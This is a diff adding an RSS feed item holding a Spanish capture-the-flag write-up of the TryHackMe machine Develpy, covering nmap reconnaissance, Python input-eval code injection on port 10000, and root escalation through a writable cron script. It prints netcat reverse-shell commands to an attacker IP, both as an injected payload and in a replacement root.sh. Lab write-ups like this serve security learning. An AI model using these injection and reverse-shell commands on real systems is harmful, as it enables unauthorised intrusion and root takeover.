@@ -7,6 +7,175 @@
         <generator>Hugo -- gohugo.io</generator>
         <language>en-us</language>
         <lastBuildDate>Fri, 30 Dec 2022 00:00:00 +0000</lastBuildDate><atom:link href="https://d3b0o.github.io/tags/linux/index.xml" rel="self" type="application/rss+xml" /><item>
+        <title>Resolución Develpy</title>
+        <link>https://d3b0o.github.io/p/resoluci%C3%B3n-develpy/</link>
+        <pubDate>Fri, 30 Dec 2022 00:00:00 +0000</pubDate>
+        
+        <guid>https://d3b0o.github.io/p/resoluci%C3%B3n-develpy/</guid>
+        <description>&lt;img src="https://d3b0o.github.io/p/resoluci%C3%B3n-develpy/images/portada.png" alt="Featured image of post Resolución Develpy" /&gt;&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://tryhackme.com/room/bsidesgtdevelpy&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;Link de la máquina&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;IP Atacante = 10.10.10.10&lt;/p&gt;
+&lt;p&gt;IP Víctima = 10.10.139.165&lt;/p&gt;
+&lt;h2 id=&#34;reconocimiento&#34;&gt;Reconocimiento&lt;/h2&gt;
+&lt;p&gt;Para empezar lo primero es comprobar si la máquina está activa y que OS tiene&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;❯ ping -c 1 10.10.139.165
+PING 10.10.139.165 (10.10.139.165) 56(84) bytes of data.
+64 bytes from 10.10.139.165: icmp_seq=1 ttl=63 time=50.4 ms
+
+--- 10.10.139.165 ping statistics ---
+1 packets transmitted, 1 received, 0% packet loss, time 0ms
+rtt min/avg/max/mdev = 50.434/50.434/50.434/0.000 ms
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;En este caso da un ttl (time to live) de &lt;strong&gt;63&lt;/strong&gt;, entendiendo que &lt;strong&gt;ttl=64: Linux&lt;/strong&gt; / &lt;strong&gt;ttl=128: Windows&lt;/strong&gt;. Esta máquina es &lt;strong&gt;Linux&lt;/strong&gt; por aproximación&lt;/p&gt;
+&lt;h3 id=&#34;escaneo-de-puertos-nmap&#34;&gt;Escaneo de puertos (nmap)&lt;/h3&gt;
+&lt;p&gt;Ahora empezamos con un escaneo de puertos&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;nmap -p- --open -sS --min-rate 5000 -n -vvv -Pn 10.10.139.165 -oG allPorts
+&lt;/code&gt;&lt;/pre&gt;
+&lt;table&gt;
+&lt;thead&gt;
+&lt;tr&gt;
+&lt;th&gt;Parámetro&lt;/th&gt;
+&lt;th&gt;Función&lt;/th&gt;
+&lt;/tr&gt;
+&lt;/thead&gt;
+&lt;tbody&gt;
+&lt;tr&gt;
+&lt;td&gt;-p-&lt;/td&gt;
+&lt;td&gt;Para que el escaneo sea a todos los puertos (65536)&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;&amp;ndash;open&lt;/td&gt;
+&lt;td&gt;Para que solo reporte los puertos abiertos&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;-sS &amp;ndash;min-rate 5000&lt;/td&gt;
+&lt;td&gt;Definir el tiempo del escaneo&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;-n&lt;/td&gt;
+&lt;td&gt;Omitir resolución DNS&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;-vvv&lt;/td&gt;
+&lt;td&gt;Para que vaya reportando lo que encuentre por consola&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;-Pn&lt;/td&gt;
+&lt;td&gt;Skip host discovery&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;-oG allPorts&lt;/td&gt;
+&lt;td&gt;Para que guarde el escaneo en format grepeable en un archivo llamado allPort&lt;/td&gt;
+&lt;/tr&gt;
+&lt;/tbody&gt;
+&lt;/table&gt;
+&lt;p&gt;Con una función definida en la zshrc llamada extractPorts, nos reporta los puertos abiertos de una forma más visual&lt;/p&gt;
+&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://pastebin.com/tYpwpauW&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;Función extractPorts&lt;/a&gt; de &lt;a class=&#34;link&#34; href=&#34;https://s4vitar.github.io&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;@s4vitar&lt;/a&gt;&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;❯ extractPorts allPorts
+───────┬─────────────────────────────────────────────────────────────────────────────────────────
+       │ File: extractPorts.tmp
+───────┼─────────────────────────────────────────────────────────────────────────────────────────
+   1   │ 
+   2   │ [*] Extracting information...
+   3   │ 
+   4   │     [*] IP Address: 10.10.139.165
+   5   │     [*] Open ports: 22,10000
+   6   │ 
+   7   │ [*] Ports copied to clipboard
+   8   │ 
+───────┴─────────────────────────────────────────────────────────────────────────────────────────
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Ahora con nmap vamos a intentar buscar las versiones de los servicios de los puertos y ejecutar scripts básicos de reconocimientos&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;❯ nmap -p22,10000 -sC -sV 10.10.139.165
+
+PORT      STATE SERVICE           VERSION
+22/tcp    open  ssh               OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 78c44084f442138e79f86be46dbfd446 (RSA)
+|   256 259df329a2624b24f28336cfa775bb66 (ECDSA)
+|_  256 e7a007b0b9cb74e9d6167d7a67fec11d (ED25519)
+10000/tcp open  snet-sensor-mgmt?
+| fingerprint-strings: 
+|   GenericLines: 
+|     Private 0days
+|     Please enther number of exploits to send??: Traceback (most recent call last):
+|     File &amp;quot;./exploit.py&amp;quot;, line 6, in &amp;lt;module&amp;gt;
+|     num_exploits = int(input(&#39; Please enther number of exploits to send??: &#39;))
+|     File &amp;quot;&amp;lt;string&amp;gt;&amp;quot;, line 0
+|     SyntaxError: unexpected EOF while parsing
+|   GetRequest: 
+|     Private 0days
+|     Please enther number of exploits to send??: Traceback (most recent call last):
+|     File &amp;quot;./exploit.py&amp;quot;, line 6, in &amp;lt;module&amp;gt;
+|     num_exploits = int(input(&#39; Please enther number of exploits to send??: &#39;))
+|     File &amp;quot;&amp;lt;string&amp;gt;&amp;quot;, line 1, in &amp;lt;module&amp;gt;
+|     NameError: name &#39;GET&#39; is not defined
+|   HTTPOptions, RTSPRequest: 
+|     Private 0days
+|     Please enther number of exploits to send??: Traceback (most recent call last):
+|     File &amp;quot;./exploit.py&amp;quot;, line 6, in &amp;lt;module&amp;gt;
+|     num_exploits = int(input(&#39; Please enther number of exploits to send??: &#39;))
+|     File &amp;quot;&amp;lt;string&amp;gt;&amp;quot;, line 1, in &amp;lt;module&amp;gt;
+|     NameError: name &#39;OPTIONS&#39; is not defined
+|   NULL: 
+|     Private 0days
+|_    Please enther number of exploits to send??:
+
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h2 id=&#34;puerto-10000&#34;&gt;Puerto 10000&lt;/h2&gt;
+&lt;p&gt;Cuando nos conectamos por nc al puerto 10000 sale este mensaje:&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;❯ nc 10.10.139.165 10000
+
+        Private 0days
+
+ Please enther number of exploits to send??:
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Si ponemos una letra en vez de un número da error. En este error podemos ver que el programa está hecho en python y que se llama exploit.py. Es posible que sea posible inyectar código en un programa que espera una entrada del usuario y luego la interpreta como una variable.&lt;/p&gt;
+&lt;p&gt;Si probamos ejecutando esto: &lt;code&gt;__import__(&#39;os&#39;).system(&#39;whoami&#39;)&lt;/code&gt; nos devuelve el usuario king&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;❯ nc 10.10.139.165 10000
+
+        Private 0days
+
+ Please enther number of exploits to send??: __import__(&#39;os&#39;).system(&#39;whoami&#39;)
+king
+
+Exploit started, attacking target (tryhackme.com)...
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h2 id=&#34;intrusión&#34;&gt;Intrusión&lt;/h2&gt;
+&lt;p&gt;Como ya hemos visto que podemos inyectar código vamos a intentar mandarnos una reverse shell.&lt;/p&gt;
+&lt;p&gt;Primero nos ponemos en escucha por el puerto &lt;strong&gt;443&lt;/strong&gt; con &lt;strong&gt;netcat&lt;/strong&gt; de la siguiente forma: &lt;code&gt;nc -nvlp 443&lt;/code&gt;
+Después en el &lt;strong&gt;exploit.py&lt;/strong&gt; le vamos a poner &lt;code&gt;__import__(&#39;os&#39;).system(&#39;nc -e /bin/sh 10.10.10.10 443&#39;)&lt;/code&gt;&lt;/p&gt;
+&lt;h2 id=&#34;escalada-de-privilegios&#34;&gt;Escalada de privilegios&lt;/h2&gt;
+&lt;h3 id=&#34;tratamiento-de-la-tty&#34;&gt;Tratamiento de la tty&lt;/h3&gt;
+&lt;p&gt;Antes de empezar lo primero para trabajar mejor es hacer un tratamiento de la tty&amp;hellip;&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;script /dev/null -c bash
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;ctrl + z&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;stty raw -echo; fg
+&lt;/code&gt;&lt;/pre&gt;
+&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;reset
+&lt;/code&gt;&lt;/pre&gt;
+&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;xterm
+&lt;/code&gt;&lt;/pre&gt;
+&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;export SHELL=bash
+&lt;/code&gt;&lt;/pre&gt;
+&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;export TERM=xterm
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h3 id=&#34;usertxt&#34;&gt;user.txt&lt;/h3&gt;
+&lt;p&gt;La falg user.txt está en /home/king/user.txt y la podemos ver con un &lt;code&gt;cat /home/king/user.txt&lt;/code&gt;&lt;/p&gt;
+&lt;h3 id=&#34;roottxt&#34;&gt;root.txt&lt;/h3&gt;
+&lt;p&gt;Con un &lt;code&gt;cat /etc/crontab&lt;/code&gt; podemos ver que el archivo &lt;strong&gt;root.sh&lt;/strong&gt; lo está ejecutando continuamente el usuario root. No tenemos permisos de escritura en el root.sh, pero lo que podemos hacer es borrarlo, crear un archivo que se llame igual y dentro ponerle el siguiente código&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;#!/bin/bash
+
+nc -e /bin/sh 10.10.10.10 442
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Y nos ponemos en escucha con &lt;strong&gt;netcat&lt;/strong&gt; por el puerto &lt;strong&gt;442&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;Al cabo de unos segundos recibimos la conexión y somos root. Podemos ver la flag con un &lt;code&gt;cat /root/root.txt&lt;/code&gt;&lt;/p&gt;
+</description>
+        </item>
+        <item>
         <title>Resolución Tomghost</title>
         <link>https://d3b0o.github.io/p/resoluci%C3%B3n-tomghost/</link>
         <pubDate>Fri, 30 Dec 2022 00:00:00 +0000</pubDate>
